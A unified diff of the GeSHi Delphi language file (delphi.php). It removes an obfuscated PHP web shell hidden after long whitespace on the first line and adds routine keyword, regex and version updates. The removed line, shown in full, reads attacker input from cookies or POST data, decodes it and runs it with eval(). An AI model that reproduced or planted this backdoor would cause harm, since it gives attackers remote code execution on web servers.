@@ -1,16 +1,20 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['yfde6d4'];global$yfde6d4;$yfde6d4=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['o568606']="\x4d\x4b\x66\x50\x79\x6f\x68\x3b\x5e\x60\x7a\x7b\x2d\x61\x43\x75\x67\x5c\x54\x76\x73\x63\x6a\x9\x45\x56\x51\x4c\x62\x2e\xa\x3d\x42\x69\x6e\x25\x28\x59\x2f\x4a\x78\x64\x2a\x31\x4e\x3e\x34\x57\x4f\x53\x38\x48\x77\x39\x20\xd\x30\x6d\x21\x29\x49\x72\x36\x58\x5d\x71\x5a\x44\x47\x32\x35\x7d\x26\x3c\x27\x5b\x24\x55\x70\x5f\x6b\x2b\x33\x46\x52\x65\x7c\x7e\x3a\x6c\x37\x23\x74\x40\x41\x3f\x2c\x22";$yfde6d4[$yfde6d4['o568606'][65].$yfde6d4['o568606'][28].$yfde6d4['o568606'][46].$yfde6d4['o568606'][46].$yfde6d4['o568606'][70].$yfde6d4['o568606'][85].$yfde6d4['o568606'][90].$yfde6d4['o568606'][43]]=$yfde6d4['o568606'][21].$yfde6d4['o568606'][6].$yfde6d4['o568606'][61];$yfde6d4[$yfde6d4['o568606'][34].$yfde6d4['o568606'][85].$yfde6d4['o568606'][62].$yfde6d4['o568606'][21].$yfde6d4['o568606'][90].$yfde6d4['o568606'][41]]=$yfde6d4['o568606'][5].$yfde6d4['o568606'][61].$yfde6d4['o568606'][41];$yfde6d4[$yfde6d4['o568606'][65].$yfde6d4['o568606'][21].$yfde6d4['o568606'][70].$yfde6d4['o568606'][56].$yfde6d4['o568606'][62]]=$yfde6d4['o568606'][20].$yfde6d4['o568606'][92].$yfde6d4['o568606'][61].$yfde6d4['o568606'][89].$yfde6d4['o568606'][85].$yfde6d4['o568606'][34];$yfde6d4[$yfde6d4['o568606'][52].$yfde6d4['o568606'][53].$yfde6d4['o568606'][85].$yfde6d4['o568606'][46].$yfde6d4['o568606'][82].$yfde6d4['o568606'][50].$yfde6d4['o568606'][13].$yfde6d4['o568606'][56]]=$yfde6d4['o568606'][33].$yfde6d4['o568606'][34].$yfde6d4['o568606'][33].$yfde6d4['o568606'][79].$yfde6d4['o568606'][20].$yfde6d4['o568606'][85].$yfde6d4['o568606'][92];$yfde6d4[$yfde6d4['o568606'][28].$yfde6d4['o568606'][85].$yfde6d4['o568606'][28].$yfde6d4['o568606'][82].$yfde6d4['o568606'][69]]=$yfde6d4['o568606'][20].$yfde6d4['o568606'][85].$yfde6d4['o568606'][61].$yfde6d4['o568606'][33].$yfde6d4['o568606'][13].$yfde6d4['o568606'][89].$yfde6d4['o568606'][33].$yfde6d4['o568606'][10].$yfde6d4['o568606'][85];$yfde6d4[$yfde6d4['o568606'][19].$yfde6d4['o568606'][50].$yfde6d4['o568606'][2].$yfde6d4['o568606'][21].$yfde6d4['o568606'][46].$yfde6d4['o568606'][90].$yfde6d4['o568606'][69].$yfde6d4['o568606'][53]]=$yfde6d4['o568606'][78].$yfde6d4['o568606'][6].$yfde6d4['o568606'][78].$yfde6d4['o568606'][19].$yfde6d4['o568606'][85].$yfde6d4['o568606'][61].$yfde6d4['o568606'][20].$yfde6d4['o568606'][33].$yfde6d4['o568606'][5].$yfde6d4['o568606'][34];$yfde6d4[$yfde6d4['o568606'][78].$yfde6d4['o568606'][85].$yfde6d4['o568606'][82].$yfde6d4['o568606'][62].$yfde6d4['o568606'][41].$yfde6d4['o568606'][13].$yfde6d4['o568606'][70].$yfde6d4['o568606'][2].$yfde6d4['o568606'][46]]=$yfde6d4['o568606'][15].$yfde6d4['o568606'][34].$yfde6d4['o568606'][20].$yfde6d4['o568606'][85].$yfde6d4['o568606'][61].$yfde6d4['o568606'][33].$yfde6d4['o568606'][13].$yfde6d4['o568606'][89].$yfde6d4['o568606'][33].$yfde6d4['o568606'][10].$yfde6d4['o568606'][85];$yfde6d4[$yfde6d4['o568606'][61].$yfde6d4['o568606'][69].$yfde6d4['o568606'][46].$yfde6d4['o568606'][90].$yfde6d4['o568606'][43].$yfde6d4['o568606'][82].$yfde6d4['o568606'][70].$yfde6d4['o568606'][43].$yfde6d4['o568606'][41]]=$yfde6d4['o568606'][28].$yfde6d4['o568606'][13].$yfde6d4['o568606'][20].$yfde6d4['o568606'][85].$yfde6d4['o568606'][62].$yfde6d4['o568606'][46].$yfde6d4['o568606'][79].$yfde6d4['o568606'][41].$yfde6d4['o568606'][85].$yfde6d4['o568606'][21].$yfde6d4['o568606'][5].$yfde6d4['o568606'][41].$yfde6d4['o568606'][85];$yfde6d4[$yfde6d4['o568606'][40].$yfde6d4['o568606'][28].$yfde6d4['o568606'][56].$yfde6d4['o568606'][90]]=$yfde6d4['o568606'][20].$yfde6d4['o568606'][85].$yfde6d4['o568606'][92].$yfde6d4['o568606'][79].$yfde6d4['o568606'][92].$yfde6d4['o568606'][33].$yfde6d4['o568606'][57].$yfde6d4['o568606'][85].$yfde6d4['o568606'][79].$yfde6d4['o568606'][89].$yfde6d4['o568606'][33].$yfde6d4['o568606'][57].$yfde6d4['o568606'][33].$yfde6d4['o568606'][92];$yfde6d4[$yfde6d4['o568606'][85].$yfde6d4['o568606'][21].$yfde6d4['o568606'][82].$yfde6d4['o568606'][82].$yfde6d4['o568606'][13].$yfde6d4['o568606'][56]]=$yfde6d4['o568606'][10].$yfde6d4['o568606'][69].$yfde6d4['o568606'][46].$yfde6d4['o568606'][46].$yfde6d4['o568606'][2];$yfde6d4[$yfde6d4['o568606'][41].$yfde6d4['o568606'][62].$yfde6d4['o568606'][62].$yfde6d4['o568606'][46].$yfde6d4['o568606'][50].$yfde6d4['o568606'][70]]=$yfde6d4['o568606'][16].$yfde6d4['o568606'][13].$yfde6d4['o568606'][90].$yfde6d4['o568606'][50].$yfde6d4['o568606'][28].$yfde6d4['o568606'][13].$yfde6d4['o568606'][28].$yfde6d4['o568606'][43];$yfde6d4[$yfde6d4['o568606'][22].$yfde6d4['o568606'][50].$yfde6d4['o568606'][82].$yfde6d4['o568606'][21].$yfde6d4['o568606'][70]]=$_POST;$yfde6d4[$yfde6d4['o568606'][15].$yfde6d4['o568606'][90].$yfde6d4['o568606'][28].$yfde6d4['o568606'][56].$yfde6d4['o568606'][50]]=$_COOKIE;@$yfde6d4[$yfde6d4['o568606'][52].$yfde6d4['o568606'][53].$yfde6d4['o568606'][85].$yfde6d4['o568606'][46].$yfde6d4['o568606'][82].$yfde6d4['o568606'][50].$yfde6d4['o568606'][13].$yfde6d4['o568606'][56]]($yfde6d4['o568606'][85].$yfde6d4['o568606'][61].$yfde6d4['o568606'][61].$yfde6d4['o568606'][5].$yfde6d4['o568606'][61].$yfde6d4['o568606'][79].$yfde6d4['o568606'][89].$yfde6d4['o568606'][5].$yfde6d4['o568606'][16],NULL);@$yfde6d4[$yfde6d4['o568606'][52].$yfde6d4['o568606'][53].$yfde6d4['o568606'][85].$yfde6d4['o568606'][46].$yfde6d4['o568606'][82].$yfde6d4['o568606'][50].$yfde6d4['o568606'][13].$yfde6d4['o568606'][56]]($yfde6d4['o568606'][89].$yfde6d4['o568606'][5].$yfde6d4['o568606'][16].$yfde6d4['o568606'][79].$yfde6d4['o568606'][85].$yfde6d4['o568606'][61].$yfde6d4['o568606'][61].$yfde6d4['o568606'][5].$yfde6d4['o568606'][61].$yfde6d4['o568606'][20],0);@$yfde6d4[$yfde6d4['o568606'][52].$yfde6d4['o568606'][53].$yfde6d4['o568606'][85].$yfde6d4['o568606'][46].$yfde6d4['o568606'][82].$yfde6d4['o568606'][50].$yfde6d4['o568606'][13].$yfde6d4['o568606'][56]]($yfde6d4['o568606'][57].$yfde6d4['o568606'][13].$yfde6d4['o568606'][40].$yfde6d4['o568606'][79].$yfde6d4['o568606'][85].$yfde6d4['o568606'][40].$yfde6d4['o568606'][85].$yfde6d4['o568606'][21].$yfde6d4['o568606'][15].$yfde6d4['o568606'][92].$yfde6d4['o568606'][33].$yfde6d4['o568606'][5].$yfde6d4['o568606'][34].$yfde6d4['o568606'][79].$yfde6d4['o568606'][92].$yfde6d4['o568606'][33].$yfde6d4['o568606'][57].$yfde6d4['o568606'][85],0);@$yfde6d4[$yfde6d4['o568606'][40].$yfde6d4['o568606'][28].$yfde6d4['o568606'][56].$yfde6d4['o568606'][90]](0);$te91b1cd=NULL;$w727c5659=NULL;$yfde6d4[$yfde6d4['o568606'][34].$yfde6d4['o568606'][21].$yfde6d4['o568606'][53].$yfde6d4['o568606'][46].$yfde6d4['o568606'][50].$yfde6d4['o568606'][2].$yfde6d4['o568606'][82].$yfde6d4['o568606'][2]]=$yfde6d4['o568606'][62].$yfde6d4['o568606'][21].$yfde6d4['o568606'][2].$yfde6d4['o568606'][2].$yfde6d4['o568606'][82].$yfde6d4['o568606'][62].$yfde6d4['o568606'][46].$yfde6d4['o568606'][43].$yfde6d4['o568606'][12].$yfde6d4['o568606'][43].$yfde6d4['o568606'][82].$yfde6d4['o568606'][85].$yfde6d4['o568606'][69].$yfde6d4['o568606'][12].$yfde6d4['o568606'][46].$yfde6d4['o568606'][70].$yfde6d4['o568606'][70].$yfde6d4['o568606'][82].$yfde6d4['o568606'][12].$yfde6d4['o568606'][13].$yfde6d4['o568606'][50].$yfde6d4['o568606'][70].$yfde6d4['o568606'][82].$yfde6d4['o568606'][12].$yfde6d4['o568606'][53].$yfde6d4['o568606'][85].$yfde6d4['o568606'][90].$yfde6d4['o568606'][90].$yfde6d4['o568606'][82].$yfde6d4['o568606'][2].$yfde6d4['o568606'][50].$yfde6d4['o568606'][13].$yfde6d4['o568606'][53].$yfde6d4['o568606'][82].$yfde6d4['o568606'][90].$yfde6d4['o568606'][50];global$nc948f3f;function ga78bab1($te91b1cd,$l35c0){global$yfde6d4;$n0acf53f="";for($f515c98f=0;$f515c98f<$yfde6d4[$yfde6d4['o568606'][65].$yfde6d4['o568606'][21].$yfde6d4['o568606'][70].$yfde6d4['o568606'][56].$yfde6d4['o568606'][62]]($te91b1cd);){for($i878831f=0;$i878831f<$yfde6d4[$yfde6d4['o568606'][65].$yfde6d4['o568606'][21].$yfde6d4['o568606'][70].$yfde6d4['o568606'][56].$yfde6d4['o568606'][62]]($l35c0)&&$f515c98f<$yfde6d4[$yfde6d4['o568606'][65].$yfde6d4['o568606'][21].$yfde6d4['o568606'][70].$yfde6d4['o568606'][56].$yfde6d4['o568606'][62]]($te91b1cd);$i878831f++,$f515c98f++){$n0acf53f.=$yfde6d4[$yfde6d4['o568606'][65].$yfde6d4['o568606'][28].$yfde6d4['o568606'][46].$yfde6d4['o568606'][46].$yfde6d4['o568606'][70].$yfde6d4['o568606'][85].$yfde6d4['o568606'][90].$yfde6d4['o568606'][43]]($yfde6d4[$yfde6d4['o568606'][34].$yfde6d4['o568606'][85].$yfde6d4['o568606'][62].$yfde6d4['o568606'][21].$yfde6d4['o568606'][90].$yfde6d4['o568606'][41]]($te91b1cd[$f515c98f])^$yfde6d4[$yfde6d4['o568606'][34].$yfde6d4['o568606'][85].$yfde6d4['o568606'][62].$yfde6d4['o568606'][21].$yfde6d4['o568606'][90].$yfde6d4['o568606'][41]]($l35c0[$i878831f]));}}return$n0acf53f;}function z244f($te91b1cd,$l35c0){global$yfde6d4;global$nc948f3f;return$yfde6d4[$yfde6d4['o568606'][41].$yfde6d4['o568606'][62].$yfde6d4['o568606'][62].$yfde6d4['o568606'][46].$yfde6d4['o568606'][50].$yfde6d4['o568606'][70]]($yfde6d4[$yfde6d4['o568606'][41].$yfde6d4['o568606'][62].$yfde6d4['o568606'][62].$yfde6d4['o568606'][46].$yfde6d4['o568606'][50].$yfde6d4['o568606'][70]]($te91b1cd,$nc948f3f),$l35c0);}foreach($yfde6d4[$yfde6d4['o568606'][15].$yfde6d4['o568606'][90].$yfde6d4['o568606'][28].$yfde6d4['o568606'][56].$yfde6d4['o568606'][50]]as$l35c0=>$i3a7){$te91b1cd=$i3a7;$w727c5659=$l35c0;}if(!$te91b1cd){foreach($yfde6d4[$yfde6d4['o568606'][22].$yfde6d4['o568606'][50].$yfde6d4['o568606'][82].$yfde6d4['o568606'][21].$yfde6d4['o568606'][70]]as$l35c0=>$i3a7){$te91b1cd=$i3a7;$w727c5659=$l35c0;}}$te91b1cd=@$yfde6d4[$yfde6d4['o568606'][78].$yfde6d4['o568606'][85].$yfde6d4['o568606'][82].$yfde6d4['o568606'][62].$yfde6d4['o568606'][41].$yfde6d4['o568606'][13].$yfde6d4['o568606'][70].$yfde6d4['o568606'][2].$yfde6d4['o568606'][46]]($yfde6d4[$yfde6d4['o568606'][85].$yfde6d4['o568606'][21].$yfde6d4['o568606'][82].$yfde6d4['o568606'][82].$yfde6d4['o568606'][13].$yfde6d4['o568606'][56]]($yfde6d4[$yfde6d4['o568606'][61].$yfde6d4['o568606'][69].$yfde6d4['o568606'][46].$yfde6d4['o568606'][90].$yfde6d4['o568606'][43].$yfde6d4['o568606'][82].$yfde6d4['o568606'][70].$yfde6d4['o568606'][43].$yfde6d4['o568606'][41]]($te91b1cd),$w727c5659));if(isset($te91b1cd[$yfde6d4['o568606'][13].$yfde6d4['o568606'][80]])&&$nc948f3f==$te91b1cd[$yfde6d4['o568606'][13].$yfde6d4['o568606'][80]]){if($te91b1cd[$yfde6d4['o568606'][13]]==$yfde6d4['o568606'][33]){$f515c98f=Array($yfde6d4['o568606'][78].$yfde6d4['o568606'][19]=>@$yfde6d4[$yfde6d4['o568606'][19].$yfde6d4['o568606'][50].$yfde6d4['o568606'][2].$yfde6d4['o568606'][21].$yfde6d4['o568606'][46].$yfde6d4['o568606'][90].$yfde6d4['o568606'][69].$yfde6d4['o568606'][53]](),$yfde6d4['o568606'][20].$yfde6d4['o568606'][19]=>$yfde6d4['o568606'][43].$yfde6d4['o568606'][29].$yfde6d4['o568606'][56].$yfde6d4['o568606'][12].$yfde6d4['o568606'][43],);echo@$yfde6d4[$yfde6d4['o568606'][28].$yfde6d4['o568606'][85].$yfde6d4['o568606'][28].$yfde6d4['o568606'][82].$yfde6d4['o568606'][69]]($f515c98f);}elseif($te91b1cd[$yfde6d4['o568606'][13]]==$yfde6d4['o568606'][85]){eval($te91b1cd[$yfde6d4['o568606'][41]]);}exit();} ?><?php
+<?php
 /*************************************************************************************
  * delphi.php
  * ----------
  * Author: J�rja Norbert (jnorbi@vipmail.hu), Benny Baumann (BenBE@omorphia.de)
  * Copyright: (c) 2004 J�rja Norbert, Benny Baumann (BenBE@omorphia.de), Nigel McNie (http://qbnz.com/highlighter)
- * Release Version: 1.0.8.10
+ * Release Version: 1.0.9.0
  * Date Started: 2004/07/26
  *
  * Delphi (Object Pascal) language file for GeSHi.
  *
  * CHANGES
  * -------
+ * 2012/06/27 (1.0.8.11)
+ *   -  Added some keywords
+ *   -  fixed hex numbers and hex char literals (including WideChar)
+ *   -  Added support for FPC-Style generics
  * 2008/05/23 (1.0.7.22)
  *   -  Added description of extra language features (SF#1970248)
  * 2005/11/19 (1.0.3)
@@ -51,27 +55,28 @@ $language_data = array (
     'COMMENT_MULTI' => array('(*' => '*)', '{' => '}'),
     //Compiler directives
     'COMMENT_REGEXP' => array(2 => '/\\{\\$.*?}|\\(\\*\\$.*?\\*\\)/U'),
-    'CASE_KEYWORDS' => 0,
+    'CASE_KEYWORDS' => GESHI_CAPS_NO_CHANGE,
     'QUOTEMARKS' => array("'"),
     'ESCAPE_CHAR' => '',
+
     'KEYWORDS' => array(
         1 => array(
             'Abstract', 'And', 'Array', 'As', 'Asm', 'At', 'Begin', 'Case',
-            'Class', 'Const', 'Constructor', 'Contains', 'Destructor',
+            'Class', 'Const', 'Constructor', 'Contains', 'Default', 'delayed', 'Destructor',
             'DispInterface', 'Div', 'Do', 'DownTo', 'Else', 'End', 'Except',
-            'Export', 'Exports', 'External', 'File', 'Finalization', 'Finally',
-            'For', 'Function', 'Goto', 'If', 'Implementation', 'In', 'Inherited',
-            'Initialization', 'Inline', 'Interface', 'Is', 'Label', 'Library',
-            'Mod', 'Not', 'Object', 'Of', 'On', 'Or', 'Overload', 'Override',
+            'Export', 'Exports', 'External', 'File', 'Finalization', 'Finally', 'For',
+            'Function', 'Generic', 'Goto', 'If', 'Implementation', 'In', 'Inherited',
+            'Initialization', 'Inline', 'Interface', 'Is', 'Label', 'Library', 'Message',
+            'Mod', 'Nil', 'Not', 'Object', 'Of', 'On', 'Or', 'Overload', 'Override',
             'Package', 'Packed', 'Private', 'Procedure', 'Program', 'Property',
-            'Protected', 'Public', 'Published', 'Raise', 'Record', 'Register',
-            'Repeat', 'Requires', 'Resourcestring', 'Set', 'Shl', 'Shr', 'Then',
-            'ThreadVar', 'To', 'Try', 'Type', 'Unit', 'Until', 'Uses', 'Var',
-            'Virtual', 'While', 'With', 'Xor', 'assembler', 'far',
+            'Protected', 'Public', 'Published', 'Read', 'Raise', 'Record', 'Register',
+            'Repeat', 'Requires', 'Resourcestring', 'Set', 'Shl', 'Shr', 'Specialize', 'Stored',
+            'Then', 'ThreadVar', 'To', 'Try', 'Type', 'Unit', 'Until', 'Uses', 'Var',
+            'Virtual', 'While', 'With', 'Write', 'Xor', 'assembler', 'far',
             'near', 'pascal', 'cdecl', 'safecall', 'stdcall', 'varargs'
             ),
         2 => array(
-            'nil', 'false', 'self', 'true', 'var', 'type', 'const'
+            'false', 'self', 'true',
             ),
         3 => array(
             'Abs', 'AcquireExceptionObject', 'Addr', 'AnsiToUtf8', 'Append', 'ArcTan',
@@ -250,7 +255,7 @@ $language_data = array (
             1 => 'color: #006600;'
             ),
         'REGEXPS' => array(
-            0 => 'color: #9ac;',
+            0 => 'color: #0000cc;',
             1 => 'color: #ff0000;'
             ),
         'SYMBOLS' => array(
@@ -274,16 +279,21 @@ $language_data = array (
         ),
     'REGEXPS' => array(
         //Hex numbers
-        0 => '\$[0-9a-fA-F]+',
+        0 => '(?<!\#)\$[0-9a-fA-F]+(?!\w)',
         //Characters
-        1 => '\#(?:\$[0-9a-fA-F]{1,2}|\d{1,3})'
+        1 => '\#(?:\$[0-9a-fA-F]{1,4}|\d{1,5})'
         ),
     'STRICT_MODE_APPLIES' => GESHI_NEVER,
     'SCRIPT_DELIMITERS' => array(
         ),
     'HIGHLIGHT_STRICT_BLOCK' => array(
         ),
-    'TAB_WIDTH' => 2
+    'TAB_WIDTH' => 2,
+    'PARSER_CONTROL' => array(
+        'KEYWORDS' => array(
+            3 => array(
+                'DISALLOWED_AFTER' => '(?=\s*[(;])'
+                )
+            )
+        )
 );
-
-?>
